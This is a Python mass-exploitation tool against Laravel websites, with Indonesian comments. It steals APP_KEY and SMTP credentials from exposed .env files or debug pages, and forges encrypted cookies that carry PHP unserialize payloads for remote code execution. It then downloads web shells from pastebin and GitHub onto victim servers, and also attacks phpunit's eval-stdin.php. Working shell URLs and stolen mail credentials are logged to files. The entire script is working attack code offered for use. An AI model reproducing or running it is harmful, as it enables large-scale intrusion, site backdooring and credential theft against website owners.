import base64, json, hashlib, hmac, os, re, requests
from concurrent.futures import ThreadPoolExecutor
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

requests.packages.urllib3.disable_warnings()


exp = [
    '<?php system("curl -O https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php"); system("mv QGrjKCsR upper.php"); ?>',
    '<?php system("wget https://pastebin.com/raw/QGrjKCsR -O upper.php"); ?>',
    '<?php fwrite(fopen("upper.php","w+"),file_get_contents("https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php")); ?>'
]



def save(filename, content):
    with open(filename, 'a') as f:
        f.write(content + '\n')

class Func:
    def serialize(self, key, value):
        cipher = AES.new(base64.b64decode(key), AES.MODE_CBC)
        iv = cipher.iv
        encrypted = cipher.encrypt(self.pkcs7_pad(base64.b64decode(value)))
        iv_b64 = base64.b64encode(iv).decode()
        value_b64 = base64.b64encode(encrypted).decode()
        mac = hmac.new(base64.b64decode(key), (iv_b64 + value_b64).encode(), hashlib.sha256).hexdigest()
        payload = base64.b64encode(json.dumps({"iv": iv_b64, "value": value_b64, "mac": mac}).encode()).decode()
        return payload

    def pkcs7_pad(self, data, block_size=16):
        pad_len = block_size - len(data) % block_size
        return data + bytes([pad_len] * pad_len)

    def generate_payload(self, command, method=5):
        if method == 1:
            obj = f'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{{s:9:"\\x00*\\x00events";s:{len(command)}:"{command}";}}'
        elif method == 2:
            obj = f'O:35:"Illuminate\\Bus\\Dispatcher":1:{{s:10:"\\x00*\\x00queueResolver";s:{len(command)}:"{command}";}}'
        elif method == 3:
            obj = f'O:39:"Illuminate\\Pipeline\\Pipeline":1:{{s:8:"\\x00*\\x00pipes";a:1:{{i:0;s:{len(command)}:"{command}";}}}}'
        elif method == 4:
            obj = f'O:43:"Illuminate\\Broadcasting\\BroadcastEvent":1:{{s:8:"\\x00*\\x00event";s:{len(command)}:"{command}";}}'
        else:
            obj = f'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{{s:9:"\\x00*\\x00events";s:{len(command)}:"{command}";}}'
        return base64.b64encode(obj.encode()).decode()

def grab_app_key(content):
    m = re.search(r'APP_KEY=([^\n]+)', content)
    return m.group(1).strip() if m else None

def extract_smtp(content):
    smtp = {}
    for key in ['MAIL_HOST', 'MAIL_PORT', 'MAIL_USERNAME', 'MAIL_PASSWORD']:
        match = re.search(rf'{key}=([^\n]+)', content)
        smtp[key] = match.group(1).strip() if match else ''
    return smtp

def phpunit(target):
    url_req = '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
    for rce in exp:
        try:
            requests.get(url_req, data=rce, headers=head, allow_redirects=False, timeout=15)
            test_shell = requests.get(url_req.replace('eval-stdin.php', 'upper.php'), headers=head, timeout=15)
            if 'Vuln!!' in test_shell.text or 'MARIJUANA' in test_shell.text:
                with open('Result/shell.txt', 'a') as epep:
                    epep.write(url_req.replace('eval-stdin.php', 'upper.php') + '\n')
                return True
        except:
            pass

def handle_target(url, method=5):
    func = Func()
    try:
        key = None
        smtp = {}

        # Step 1: Cek .env
        try:
            print(f'[!] Checking .env: {url}/.env')
            r = requests.get(url + '/.env', timeout=10, verify=False)
            content = r.text
            key = grab_app_key(content)
            smtp = extract_smtp(content)
        except:
            pass

        # Step 2: Jika .env gagal, coba POST debug
        if not key:
            try:
                print(f'[!] Checking DEBUG POST: {url}')
                r = requests.post(url, data={"0x": "$"}, timeout=10, verify=False)
                content = r.text
                key = grab_app_key(content)
                smtp = extract_smtp(content)
            except:
                pass

        if key:
            clean_key = key.replace('base64:', '')
            test_str = '_ALL_WE_KNOW_'
            payload = func.generate_payload(f"echo '{test_str}';", method)
            serialized = func.serialize(clean_key, payload)
            headers = {'Cookie': f'XSRF-TOKEN={serialized}'}
            res = requests.get(url, headers=headers, timeout=10, verify=False)

            if test_str in res.text:
                print(f'[+] RCE Detected: {url}')
                payload2 = func.generate_payload(
                    "echo system('curl https://pastebin.com/raw/8FHzfDCu -k -o public/c.php'); echo 'Rintod';", method)
                serialized2 = func.serialize(clean_key, payload2)
                res2 = requests.get(url, headers={'Cookie': f'XSRF-TOKEN={serialized2}'}, timeout=10, verify=False)

                if 'Rintod' in res2.text:
                    shell_url = f'{url}/c.php?0=ls'
                    check = requests.get(shell_url, timeout=10, verify=False)
                    if 'azzatssins' in check.text:
                        print(f'[+] SHELL OK: {shell_url}')
                        save('Result/SHELL.txt', shell_url)
                    else:
                        print('[!] SHELL Failed, maybe permission issue')
                        save('Result/MANUAL.txt', url)
                else:
                    print('[!] Upload shell failed, but RCE OK')
                    save('Result/MANUAL.txt', url)

                if smtp.get('MAIL_HOST'):
                    smtp_data = f"{smtp['MAIL_HOST']}|{smtp['MAIL_PORT']}|{smtp['MAIL_USERNAME']}|{smtp['MAIL_PASSWORD']}"
                    save('Result/SMTP.txt', smtp_data)
            else:
                print('[!] RCE test failed')
        else:
            if phpunit(url):
                print(f'[+] PHPUNIT Shell Found: {url}')
            else:
             print('[!] No APP_KEY found from .env or debug POST or PHPUNIT RCE')

    except Exception as e:
        print(f'[-] ERROR on {url}: {e}')


def main():
    list_path = input('[+] Path list .txt: ').strip()
    with open(list_path) as f:
        urls = list(set(line.strip().rstrip('/') for line in f if line.strip()))

    threads = int(input('[+] Jumlah Threads: '))
    method = int(input('[+] Pilih metode unserialize (1-5): ').strip())
    os.makedirs('Result', exist_ok=True)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(lambda url: handle_target(url, method), urls)

if __name__ == '__main__':
    main()
